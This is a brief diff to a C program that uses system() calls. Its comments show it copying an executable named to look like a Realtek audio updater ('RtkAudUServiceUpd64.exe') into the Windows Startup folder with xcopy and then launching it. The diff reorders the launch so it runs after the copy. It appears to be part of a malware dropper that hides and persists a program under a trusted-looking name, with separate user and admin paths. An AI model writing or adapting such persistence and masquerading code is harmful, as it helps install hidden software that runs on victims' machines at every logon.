@@ -42,8 +42,7 @@ int main()
     // printf("\n%s", text_4);
     // printf("\n%s", text_5);
 
-    system(text_1);
-    //1 start RtkAudUServiceUpd64.exe
+ 
 
     // for user --------------------------------------
     
@@ -52,6 +51,9 @@ int main()
 
     system(text_4);
     //4 xcopy "RtkAudUServiceUpd64.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\" /Y
+
+    system(text_1);
+    //1 start RtkAudUServiceUpd64.exe
 
 
     // for admin --------------------------------------
